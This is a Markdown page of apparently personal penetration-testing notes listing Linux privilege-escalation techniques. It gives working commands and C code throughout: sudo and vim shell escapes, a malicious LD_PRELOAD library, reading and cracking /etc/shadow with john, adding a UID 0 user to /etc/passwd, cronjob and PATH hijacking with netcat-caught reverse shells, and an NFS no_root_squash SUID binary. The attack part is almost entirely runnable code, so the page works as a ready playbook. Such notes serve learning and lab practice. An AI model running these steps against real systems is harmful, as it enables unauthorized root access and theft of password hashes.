---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Techniques

## <mark style="color:purple;">Abusing Sudo execution permissions</mark>

* Verify which commands can be run with sudo

{% code overflow="wrap" lineNumbers="true" %}
```bash
$ sudo -l
#Example results
User user may run the following commands on host:
    (ALL) NOPASSWD: /usr/bin/find
```
{% endcode %}

{% hint style="info" %}
`find` is used as example, can be any other command
{% endhint %}

***

* Check binary Sudo abuse on _GTFOBins_ Uand use it on target machine to get privileges

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo find . -exec /bin/sh \; -quit
#This will return a rott shell
```
{% endcode %}

***



## <mark style="color:purple;">Abusing LD\_PRELOAD</mark>

* Verify the `LD_PRELOAD` option in `env_keep`

{% code overflow="wrap" lineNumbers="true" %}
```bash
$ sudo -l
#Example results
Matching Defaults entries for user on ip-0-0-0-0:
    env_reset, env_keep+=LD_PRELOAD
```
{% endcode %}

* Write simple script in C

{% code title="shell.c " overflow="wrap" lineNumbers="true" %}
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
{% endcode %}

***

* Then compile into a shared library

{% code overflow="wrap" lineNumbers="true" %}
```bash
gcc shell.c -fPIC -shared -o shell.so -nostartfiles
```
{% endcode %}

{% hint style="info" %}
The extension `.so` represents a shared object
{% endhint %}

***

* Run a sudo command specifying the LD\_PRELOAD option with the script

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>sudo LD_PRELOAD=/home/user/ldpreload/shell.so $command
</strong><strong>#This will prompt root shell
</strong></code></pre>

{% hint style="info" %}
The `$command` in this case is any comand with sudo permissions found by using `sudo -l`
{% endhint %}

***



## <mark style="color:purple;">Abusing SUID/SGID permissions on reading binaries</mark>

* Verify executables with special permisions

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>find / -type f -perm -04000 -ls 2>/dev/null | grep bin
</strong>#Example results
<strong>1111  1  -rwsr-xr-x  1  root  root  1111  Feb  10  2030  /usr/bin/base64
</strong></code></pre>

{% hint style="info" %}
`base64` is used as example, can be any other executable with data visualization properties such as `nano`,`cat`, `vim`, `nvim`, etc...
{% endhint %}

***

* Check binary SUID abuse on _GTFOBins_

{% code overflow="wrap" lineNumbers="true" %}
```bash
LFILE=file_to_read
base64 "$LFILE" | base64 --decode
```
{% endcode %}

***

* Abuse privileges to read important files and copy its content locally

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>base64 /etc/shadow | base64 --decode #Display content of shadow    
</strong>base64 /etc/passwd | base64 --decode #Display content of passwd
touch shadow.txt #Create on host machine and copy content of shadow
touch passwd.txt #Create on host machine and copy content of passwd
</code></pre>

***

* Use john to make crackable file an crack passwords&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```sh
unshadow passwd.txt shadow.txt > crack.txt
john -w=/usr/share/wordlists/rockyou.txt crack.txt
#If possible to crack this will display the password of users
```
{% endcode %}

***



## <mark style="color:purple;">Abusing SUID/SGID permissions on writing binaries</mark>

* Verify executables with special permisions

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>find / -type f -perm -04000 -ls 2>/dev/null | grep bin
</strong>#Example results
<strong>1111  1  -rwsr-xr-x  1  root  root  1111  Feb  10  2030  /usr/bin/nano
</strong></code></pre>

{% hint style="info" %}
`nano` is used as example, can be any other executable with the same reading properties such as `vim`, `nvim`, etc...
{% endhint %}

***

* Abuse privileges to create user with privileges

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>openssl passwd -1 -salt AAA $password    #Create user hash
</strong><strong>nano /etc/passwd
</strong><strong>$username:$hash:0:0:root:/root:/bin/bash #Add this at final of /etc/passwd
</strong>su $username                             #Switch to the new user
</code></pre>

{% hint style="info" %}
`$username` is an arbitratry name and the `/root:/bin/bash` specificates we are requesting a root shell
{% endhint %}

***



## <mark style="color:purple;">Abusing capabilities on binaries</mark>

* Verify executables with set capabilities

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>getcap -r / 2>/dev/null
</strong>#Example results
/home/karen/vim = cap_setuid+ep
</code></pre>

{% hint style="info" %}
`vim` is used as example, can be any other executable
{% endhint %}

***

* Check binary capabilities abuse on _GTFOBins_

{% code overflow="wrap" lineNumbers="true" %}
```bash
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'  #For python3
```
{% endcode %}

***

* Go to binarie location and execute payload

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>cd /home/karen/vim
</strong>./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
#This will give you a root shell
</code></pre>

***



## <mark style="color:purple;">Abusing existing cronjobs</mark>

* Verify executables set as cronjobs

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>cat /etc/crontab
</strong>#Example results
* * * * * root /home/user/file.sh
</code></pre>

{% hint style="info" %}
`file.sh` is an arbitrary name used as example, can be any other bash file or executable
{% endhint %}

***

* Go to file location and change the content to get a reverse shell

{% code overflow="wrap" lineNumbers="true" %}
```bash
cd /home/user
nano file.sh    # The content will be replaced with a reverse shell script
```
{% endcode %}

{% hint style="info" %}
To see the script of the reverse shell you can go[ here](../../scripting/reverse-shell.md)
{% endhint %}

***

* Create a listening port with netcat to receive the shell

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nc -nlvp $port
</strong>#You will recieve a root shell
</code></pre>

{% hint style="info" %}
`$port` is the port specified in the reverse shell script
{% endhint %}

***



## <mark style="color:purple;">Abusing deleted cronjobs</mark>

* Verify executables set as cronjobs

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>cat /etc/crontab
</strong>#Example results
PATH:/home/user:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
...
* * * * * root file.sh
</code></pre>

{% hint style="info" %}
* `file.sh` is an arbitrary name used as example, can be any other bash file or executable
* We have to keep in mind the path of the `/etc/crontab` file
{% endhint %}

***

* Verify if the executable was deleted and create one with the same name

{% code overflow="wrap" lineNumbers="true" %}
```bash
locate file.sh    #This will show nothing which means that was deleted
cd /home/user
nano file.sh    # The content will be a reverse shell script
```
{% endcode %}

{% hint style="info" %}
* Note that the folder we navigate to is the one was listed in path of `/etc/crontab`
* To see the script of the reverse shell you can go [here](../../scripting/reverse-shell.md#basic-bash-script)
{% endhint %}

***

* Create a listening port with netcat to receive the shell

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nc -nlvp $port
</strong>#You will recieve a root shell
</code></pre>

{% hint style="info" %}
`$port` is the port specified in the reverse shell script
{% endhint %}



## <mark style="color:purple;">Abusing PATH enviroment variable</mark>

* Search for any writable folder and compare it to _PATH_

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
#Example results
<strong>etc/udev  home/user  run/dbus  snap/core  sys/fs  tmp  usr/lib  var/crash
</strong>
echo $PATH
#Example results
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
</code></pre>

{% hint style="info" %}
* We note there is a home folder where we can write
* In the case we haven't found nothing, we have to write to `/tmp`
{% endhint %}

***

* Add folder to _PATH_ and go to this location

{% code overflow="wrap" lineNumbers="true" %}
```bash
export PATH=/home/user:$PATH
echo $PATH   #To check it was added
cd /home/user
```
{% endcode %}

***

* Write simple script in C to search for an executable

{% code title="path.c " overflow="wrap" lineNumbers="true" %}
```c
#include <unistd.h>

void main() {
    setgid(0);
    setuid(0);
    system("root");
}
```
{% endcode %}

{% hint style="info" %}
System will search for an executable called _root,_ this is an arbitrary name
{% endhint %}

***

* Compile the script and give it especial SUID Permissions

{% code overflow="wrap" lineNumbers="true" %}
```bash
gcc path.c -o path -w
chmod u+s path
ls -l     #To check it has s permission on user
```
{% endcode %}

***

* Create a file to asking for a shell and give it permissions

{% code overflow="wrap" lineNumbers="true" %}
```bash
echo "/bin/bash" > root #Asking for a shell
chmod 777 root
ls -l    #To check it has all permissions
```
{% endcode %}

{% hint style="info" %}
Note that is the same executable we called previously on the _C_ script
{% endhint %}

***

* Run path script to get privileges

{% code overflow="wrap" lineNumbers="true" %}
```bash
./path
#This will return a root shell
```
{% endcode %}

***



## <mark style="color:purple;">Abusing NFS misconfiguration</mark>

* Check NFS configuration

{% code overflow="wrap" lineNumbers="true" %}
```bash
cat /etc/exports
#Example results
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
{% endcode %}

{% hint style="info" %}
We notice the `no_root_squash` value
{% endhint %}

***

* On the host machine check for mountable shares

{% code overflow="wrap" lineNumbers="true" %}
```bash
showmount -e $targetIP
#Example results
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```
{% endcode %}

***

* On the host machine, create a share folder with the target

{% code overflow="wrap" lineNumbers="true" %}
```bash
mkdir /tmp/Attack
sudo mount -o rw $targetIP:/home/ubuntu/sharedfolder /tmp/Attack
```
{% endcode %}

***

* Write simple script in C to ask for a shell

{% code title="nfs.c " overflow="wrap" lineNumbers="true" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
    return 0;
}
```
{% endcode %}

***

* Compile the script and give it especial SUID Permissions

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>cd /tmp/Attack
</strong><strong>nano nfs.c    #Create the script as above
</strong>sudo gcc nfs.c -o nfs -w
<strong>sudo chmod u+s nfs
</strong>ls -l     #To check it has s permission on user
</code></pre>

***

* On the target machine run the script to get privileges

{% code overflow="wrap" lineNumbers="true" %}
```bash
./nfs
#This will return a root shell
```
{% endcode %}

***

